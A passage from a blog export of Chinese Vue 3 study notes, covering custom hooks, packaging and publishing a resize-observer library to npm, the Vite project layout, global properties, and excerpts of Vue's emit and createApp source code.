执行对应的回调函数</span></span><br><span class="line">  <span class="keyword">if</span> (handler) &#123;</span><br><span class="line">    <span class="title function_">callWithAsyncErrorHandling</span>(</span><br><span class="line">      handler,</span><br><span class="line">      instance,</span><br><span class="line">      <span class="title class_">ErrorCodes</span>.<span class="property">COMPONENT_EVENT_HANDLER</span>,</span><br><span class="line">      args</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> onceHandler = props[handlerName + <span class="string">`Once`</span>]</span><br><span class="line">  <span class="keyword">if</span> (onceHandler) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!instance.<span class="property">emitted</span>) &#123;</span><br><span class="line">      instance.<span class="property">emitted</span> = &#123;&#125; <span class="keyword">as</span> <span class="title class_">Record</span>&lt;<span class="built_in">any</span>, <span class="built_in">boolean</span>&gt;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (instance.<span class="property">emitted</span>[handlerName]) &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    instance.<span class="property">emitted</span>[handlerName] = <span class="literal">true</span></span><br><span class="line">    <span class="title function_">callWithAsyncErrorHandling</span>(</span><br><span class="line">      onceHandler,</span><br><span class="line">      instance,</span><br><span class="line">      <span class="title class_">ErrorCodes</span>.<span class="property">COMPONENT_EVENT_HANDLER</span>,</span><br><span class="line">      args</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__COMPAT__) &#123;</span><br><span class="line">    <span class="title function_">compatModelEmit</span>(instance, event, args)</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">compatInstanceEmit</span>(instance, event, args)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>自定义Hooks</title>
    <url>/web/study/Vue/28.%E8%87%AA%E5%AE%9A%E4%B9%89Hooks.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Vue2的Mixins"><a href="#Vue2的Mixins" class="headerlink" title="Vue2的Mixins"></a>Vue2的Mixins</h1><p>在Vue2里就有类似的Mixins。</p>
<p>Mixins能将多个相同的逻辑抽离出来，各个组件只要引入mixins，就能实现一次写代码，多组件受益的效果。</p>
<p>但Mixins存在其问题</p>
<ol>
<li><p>会涉及到覆盖的问题，组件的data、methods、filters会覆盖mixin中的同名data、methods、filters</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202305252036211.png"></p>
</li>
<li><p>来自mixins的变量难以使用，隐式传入不利于阅读，使代码难以维护</p>
</li>
</ol>
<h1 id="hooks"><a href="#hooks" class="headerlink" title="hooks"></a>hooks</h1><p>使用hooks做一个根据图片生成base64的逻辑</p>
<p>hooks&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; onMounted &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Options</span> = &#123;</span><br><span class="line">  <span class="attr">el</span>:<span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span>(<span class="params">options:Options</span>):<span class="title class_">Promise</span>&lt;&#123;<span class="attr">baseUrl</span>:<span class="built_in">string</span>&#125;&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">onMounted</span>(<span class="function">()=&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="attr">img</span>:<span class="title class_">HTMLImageElement</span> = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(options.<span class="property">el</span>) <span class="keyword">as</span> <span class="title class_">HTMLImageElement</span></span><br><span class="line">      <span class="comment">// 等图片加载完成后再转换，不然会报错</span></span><br><span class="line">      img.<span class="property">onload</span> = <span class="function">()=&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(&#123;</span><br><span class="line">          <span class="attr">baseUrl</span>:<span class="title function_">base64</span>(img)</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">const</span> <span class="title function_">base64</span> = (<span class="params">el:HTMLImageElement</span>)=&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> canvas = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;canvas&quot;</span>)</span><br><span class="line">      <span class="keyword">const</span> ctx = canvas.<span class="title function_">getContext</span>(<span class="string">&quot;2d&quot;</span>)</span><br><span class="line">      canvas.<span class="property">width</span> = el.<span class="property">width</span></span><br><span class="line">      canvas.<span class="property">height</span> = el.<span class="property">height</span></span><br><span class="line">      <span class="comment">// 根据图片画canvas</span></span><br><span class="line">      ctx?.<span class="title function_">drawImage</span>(el,<span class="number">0</span>,<span class="number">0</span>,canvas.<span class="property">width</span>,canvas.<span class="property">height</span>)</span><br><span class="line">      <span class="comment">// 获取图片的后缀名</span></span><br><span class="line">      <span class="keyword">const</span> src = el.<span class="property">src</span></span><br><span class="line">      <span class="keyword">const</span> suffix = src.<span class="title function_">substring</span>(src.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>)</span><br><span class="line">      <span class="comment">// 导出一个base64</span></span><br><span class="line">      <span class="keyword">return</span> canvas.<span class="title function_">toDataURL</span>(<span class="string">`image/<span class="subst">$&#123;suffix&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;img id=&quot;img&quot; width=&quot;300&quot; height=&quot;300&quot; src=&quot;./assets/images/Computer Love EP_109951166194032069.jpg&quot; alt=&quot;&quot;&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import useBase64 from &quot;@/hooks/index&quot;</span><br><span class="line">useBase64(&#123;el: &quot;#img&quot;&#125;).then(console.log)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>NPM库的打包和上传</title>
    <url>/web/study/Vue/29.NPM%E5%BA%93%E7%9A%84%E6%89%93%E5%8C%85%E5%92%8C%E4%B8%8A%E4%BC%A0.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h1><p>需求：实现一个函数，同时支持hook和自定义指令，去监听DOM宽高的变化</p>
<p>攻克点：</p>
<ol>
<li>如何监听DOM宽高变化</li>
<li>如何用vite打包库</li>
<li>如何发布npm</li>
</ol>
<h1 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h1><p>创建一个基本的工程，作为开发依赖引入vue3和vite后，编写src&#x2F;index.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="keyword">type</span> &#123; <span class="title class_">App</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// MutationObserver 主要侦听子集、属性、增删改查的变化</span></span><br><span class="line"><span class="comment">// ResizeObserver 主要侦听元素宽高的变化</span></span><br><span class="line"><span class="comment">// 实现自定义hook</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">useResize</span>(<span class="params">el: HTMLElement, callback: <span class="built_in">Function</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> resize = <span class="keyword">new</span> <span class="title class_">ResizeObserver</span>(<span class="function">(<span class="params">entries</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 用回调函数回传元素宽高</span></span><br><span class="line">    <span class="title function_">callback</span>(entries[<span class="number">0</span>].<span class="property">contentRect</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">  resize.<span class="title function_">observe</span>(el)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Vue插件的规范（实现install函数）</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">install</span> = (<span class="params">app:App</span>)=&gt; &#123;</span><br><span class="line">  <span class="comment">// 实现自定义指令</span></span><br><span class="line">  app.<span class="title function_">directive</span>(<span class="string">&quot;resize&quot;</span>, &#123;</span><br><span class="line">    <span class="title function_">mounted</span>(<span class="params">el,binding</span>) &#123;</span><br><span class="line">      <span class="title function_">useResize</span>(el,binding.<span class="property">value</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把install方法加到useResize身上</span></span><br><span class="line">useResize.<span class="property">install</span> = install</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> useResize</span><br></pre></td></tr></table></figure>

<p>编写声明文件index.d.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">App</span> &#125; <span class="keyword">from</span> <span class="string">&quot;vue&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 编写声明文件</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">const</span> <span class="attr">useResize</span>: &#123;</span><br><span class="line">  (<span class="attr">el</span>:<span class="title class_">HTMLElement</span>,<span class="attr">callback</span>:<span class="title class_">Function</span>):<span class="built_in">void</span></span><br><span class="line">  <span class="attr">install</span>:<span class="function">(<span class="params">app:App</span>)=&gt;</span><span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> useResize</span><br></pre></td></tr></table></figure>

<h1 id="打包成库"><a href="#打包成库" class="headerlink" title="打包成库"></a>打包成库</h1><p>配置vite.config.js：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineConfig &#125; <span class="keyword">from</span> <span class="string">&quot;vite&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// umd 支持amd、cmd、cjs和全局变量模式</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">build</span>: &#123;</span><br><span class="line">    <span class="comment">// 开发面向浏览器的库时使用</span></span><br><span class="line">    <span class="attr">lib</span>: &#123;</span><br><span class="line">      <span class="comment">// 入口文件</span></span><br><span class="line">      <span class="attr">entry</span>: <span class="string">&quot;src/index.ts&quot;</span>,</span><br><span class="line">      <span class="comment">// 包名</span></span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;useResize&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// 透传属性</span></span><br><span class="line">    <span class="attr">rollupOptions</span>: &#123;</span><br><span class="line">      <span class="comment">// 排除vue（不想被打包进库的依赖）</span></span><br><span class="line">      <span class="attr">external</span>: [<span class="string">&quot;vue&quot;</span>],</span><br><span class="line">      <span class="attr">output</span>:&#123;</span><br><span class="line">        <span class="attr">globals</span>:&#123;</span><br><span class="line">          <span class="comment">// 给umd全局变量用</span></span><br><span class="line">          <span class="attr">useResize</span>:<span class="string">&quot;useResize&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>使用vite build将包打出来，会在dist文件夹打出两个文件，.mjs是ES Module模式，.umd.js是各种模式的综合。</p>
<h1 id="发布到NPM"><a href="#发布到NPM" class="headerlink" title="发布到NPM"></a>发布到NPM</h1><p>修改package.json：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v-resize&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist/v-resize.umd.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist/v-resize.mjs&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite build&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;dist&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;index.d.ts&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;vite&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.3.8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;vue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.3.4&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后通过三步把包发到npm上：</p>
<ol>
<li>需要拥有npm账号，没有的话使用npm adduser命令注册</li>
<li>登录npm，使用npm login</li>
<li>使用npm publish发布</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>vite</tag>
        <tag>npm</tag>
      </tags>
  </entry>
  <entry>
    <title>Vite目录&amp;Vue单文件组件&amp;npm run dev</title>
    <url>/web/study/Vue/3.Vite%E7%9B%AE%E5%BD%95&amp;Vue%E5%8D%95%E6%96%87%E4%BB%B6%E7%BB%84%E4%BB%B6&amp;npm%20run%20dev.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Vite目录"><a href="#Vite目录" class="headerlink" title="Vite目录"></a>Vite目录</h1><ul>
<li>public：存放不会被Vite编译的静态资源</li>
<li>src<ul>
<li>assets：存放静态资源</li>
<li>components：存放组件</li>
<li>App.vue：Vue全局入口文件</li>
<li>main.ts：全局TS文件，可以引入全局样式、全局API、配置等</li>
<li>vite-env.d.ts：声明文件扩充，脚手架默认做了*.vue文件的声明扩充</li>
<li>index.html：Vite入口文件，使用ES Module形式引入main.ts</li>
<li>package.json：一些命令、依赖等</li>
<li>tsconfig.json：TS配置文件</li>
<li>vite.config.ts：Vite配置文件</li>
</ul>
</li>
</ul>
<p>Vite基于esbuild做编译；基于rollup.js做打包，性能优异。</p>
<h1 id="单文件组件（SFC）"><a href="#单文件组件（SFC）" class="headerlink" title="单文件组件（SFC）"></a>单文件组件（SFC）</h1><p>主要由三部分组成：</p>
<ul>
<li>script，写JS代码，setup形式的script在一个SFC中只能存在一个，非setup形式可存在多个</li>
<li>template，写HTML标签，在一个SFC中只能存在一个</li>
<li>style：写CSS样式</li>
</ul>
<h1 id="Vue3开发插件"><a href="#Vue3开发插件" class="headerlink" title="Vue3开发插件"></a>Vue3开发插件</h1><p>Volar（Vue Language Features和TypeScript Vue Plugin）：Vue3智能提示，使用时需禁用Vue2的Vetur。</p>
<h1 id="npm-run-dev"><a href="#npm-run-dev" class="headerlink" title="npm run dev"></a>npm run dev</h1><p>终端输入npm run dev命令后进行的全过程：</p>
<ol>
<li>收到命令，寻找package.json的scripts，查看对应的命令</li>
<li>npm run dev对应的是vite命令，执行它<ul>
<li>直接执行vite命令一般不生效，如果没做过相应配置，只能通过npm run dev执行</li>
<li>Vite在package.json中做了一个软链接（到bin），连至bin目录，里面有三个Vite的配置<ul>
<li>vite：主要给UNIX操作系统使用，通过shell脚本执行对应的vite.js</li>
<li>vite.cmd：主要给Windows操作系统使用</li>
<li>vite.ps1：跨平台，在各种操作系统都能使用</li>
</ul>
</li>
<li>查找规则：<ol>
<li>node_modules&#x2F;vite寻找bin中可执行的文件，找到则执行，找不到则到2</li>
<li>去npm全局包找，找到则执行，找不到则到3</li>
<li>找环境变量，找到则执行，找不到则报错</li>
</ol>
</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Vite</tag>
      </tags>
  </entry>
  <entry>
    <title>定义全局函数和变量</title>
    <url>/web/study/Vue/30.%E5%AE%9A%E4%B9%89%E5%85%A8%E5%B1%80%E5%87%BD%E6%95%B0%E5%92%8C%E5%8F%98%E9%87%8F.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="globalProperties"><a href="#globalProperties" class="headerlink" title="globalProperties"></a>globalProperties</h1><p>Vue3没有Prototype属性，所以使用app.config.globalProperties代替去定义变量和函数。</p>
<p>Vue2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vue.prototype.$http = ()=&gt;&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>Vue3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const app = create App(&#123;&#125;)</span><br><span class="line">app.config.globalProperties.$http = ()=&gt;&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>另外，Vue3废除了filters，但可以用全局函数代替。</p>
<p>main.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//其他省略</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="property">config</span>.<span class="property">globalProperties</span>.<span class="property">$env</span> = <span class="string">&quot;dev&quot;</span></span><br><span class="line">app.<span class="property">config</span>.<span class="property">globalProperties</span>.<span class="property">$filters</span> = &#123;</span><br><span class="line">  format&lt;T&gt;(<span class="attr">str</span>:T) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`114514<span class="subst">$&#123;str&#125;</span>`</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Filter</span> = &#123;</span><br><span class="line">  format&lt;T&gt;(<span class="attr">str</span>:T):<span class="built_in">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不扩充类型的话使用时会报错</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&quot;vue&quot;</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">interface</span> <span class="title class_">ComponentCustomProperties</span> &#123;</span><br><span class="line">    <span class="attr">$env</span>: <span class="built_in">string</span></span><br><span class="line">    <span class="attr">$filters</span>: <span class="title class_">Filter</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 定义完后，可以直接在任何模板中访问到全局函数/变量 --&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; $env &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; $filters.format(&quot;1919810&quot;) &#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt; </span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">// 在ts内则需要通过组件实例获取</span><br><span class="line">const app = getCurrentInstance()</span><br><span class="line">console.log(app?.proxy?.$env)</span><br><span class="line">console.log(app?.proxy?.$filters.format(&quot;1919810&quot;))</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>在Vue源码（<code>/package/runtime-core/src/apiCreateApp.ts</code>）中可以看到createApp的源码。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义的很多属性在此初始化</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">createAppContext</span>(<span class="params"></span>): <span class="title class_">AppContext</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">app</span>: <span class="literal">null</span> <span class="keyword">as</span> <span class="built_in">any</span>,</span><br><span class="line">    <span class="attr">config</span>: &#123;</span><br><span class="line">      <span class="attr">isNativeTag</span>: <span class="variable constant_">NO</span>,</span><br><span class="line">      <span class="attr">performance</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="comment">// 全局函数变量在这呢</span></span><br><span class="line">      <span class="attr">globalProperties</span>: &#123;&#125;,</span><br><span class="line">      <span class="attr">optionMergeStrategies</span>: &#123;&#125;,</span><br><span class="line">      <span class="attr">errorHandler</span>: <span class="literal">undefined</span>,</span><br><span class="line">      <span class="attr">warnHandler</span>: <span class="literal">undefined</span>,</span><br><span class="line">      <span class="attr">compilerOptions</span>: &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">mixins</span>: [],</span><br><span class="line">    <span class="attr">components</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">directives</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">provides</span>: <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>),</span><br><span class="line">    <span class="attr">optionsCache</span>: <span class="keyword">new</span> <span class="title class_">WeakMap</span>(),</span><br><span class="line">    <span class="attr">propsCache</span>: <span class="keyword">new</span> <span class="title class_">WeakMap</span>(),</span><br><span class="line">    <span class="attr">emitsCache</span>: <span class="keyword">new</span> <span class="title class_">WeakMap</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化函数</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> createAppAPI&lt;<span class="title class_">HostElement</span>&gt;(</span><br><span class="line">  <span class="attr">render</span>: <span class="title class_">RootRenderFunction</span>&lt;<span class="title class_">HostElement</span>&gt;,</span><br><span class="line">  hydrate?: <span class="title class_">RootHydrateFunction</span></span><br><span class="line">): <span class="title class_">CreateAppFunction</span>&lt;<span class="title class_">HostElement</span>&gt; &#123;</span><br><span class="line">  <span class="comment">// 返回项目里用到的createApp函数，接收一个根组件（通常是App.vue）</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">createApp</span>(<span class="params">rootComponent, rootProps = <span class="literal">null</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">isFunction</span>(rootComponent)) &#123;</span><br><span class="line">      rootComponent = <span class="title function_">extend</span>(&#123;&#125;, rootComponent)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rootProps != <span class="literal">null</span> &amp;&amp; !<span class="title function_">isObject</span>(rootProps)) &#123;</span><br><span class="line">      __DEV__ &amp;&amp; <span class="title function_">warn</span>(<span class="string">`root props passed to app.mount() must be an object.`</span>)</span><br><span class="line">      rootProps = <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    <span class="keyword">const</span> context = <span class="title function_">createAppContext</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO remove in 3.4</span></span><br><span class="line">    <span class="comment">// 开发团队说这块代码在3.4版本会移除</span></span><br><span class="line">    <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(context.<span class="property">config</span>, <span class="string">&#x27;unwrapInjectedRef&#x27;</span>, &#123;</span><br><span class="line">        <span class="title function_">get</span>(<span class="params"></span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">set</span>(<span class="params"></span>) &#123;</span><br><span class="line">          <span class="title function_">warn</span>(</span><br><span class="line">            <span class="string">`app.config.unwrapInjectedRef has been deprecated. `</span> +</span><br><span class="line">              <span class="string">`3.3 now alawys unwraps injected refs in Options API.`</span></span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> installedPlugins = <span class="keyword">new</span> <span class="title class_">Set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> isMounted = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋给app这个对象，填充这些属性和方法</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">app</span>: <span class="title class_">App</span> = (context.<span class="property">app</span> = &#123;</span><br><span class="line">      <span class="attr">_uid</span>: uid++,</span><br><span class="line">      <span class="attr">_component</span>: rootComponent <span class="keyword">as</span> <span class="title class_">ConcreteComponent</span>,</span><br><span class="line">      <span class="attr">_props</span>: rootProps,</span><br><span class="line">      <span class="attr">_container</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">_context</span>: context,</span><br><span class="line">      <span class="attr">_instance</span>: <span class="literal">null</span>,</span><br><span class="line"></span><br><span class="line">      version,</span><br><span class="line"></span><br><span class="line">      <span class="keyword">get</span> <span class="title function_">config</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> context.<span class="property">config</span></span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      <span class="keyword">set</span> <span class="title function_">config</span>(<span class="params">v</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">warn</span>(</span><br><span class="line">            <span class="string">`app.config cannot be replaced. Modify individual options instead.`</span></span><br><span class="line">          )</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 注册一些插件</span></span><br><span class="line">      <span class="title function_">use</span>(<span class="params">plugin: Plugin, ...options: <span class="built_in">any</span>[]</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (installedPlugins.<span class="title function_">has</span>(plugin)) &#123;</span><br><span class="line">          __DEV__ &amp;&amp; <span class="title function_">warn</span>(<span class="string">`Plugin has already been applied to target app.`</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (plugin &amp;&amp; <span class="title function_">isFunction</span>(plugin.<span class="property">install</span>)) &#123;</span><br><span class="line">          installedPlugins.<span class="title function_">add</span>(plugin)</span><br><span class="line">          plugin.<span class="title function_">install</span>(app, ...options)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">isFunction</span>(plugin)) &#123;</span><br><span class="line">          installedPlugins.<span class="title function_">add</span>(plugin)</span><br><span class="line">          <span class="title function_">plugin</span>(app, ...options)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (__DEV__) &#123;</span><br><span class="line">          <span class="title function_">warn</span>(</span><br><span class="line">            <span class="string">`A plugin must either be a function or an object with an &quot;install&quot; `</span> +</span><br><span class="line">              <span class="string">`function.`</span></span><br><span class="line">          )</span><br><span class="line">        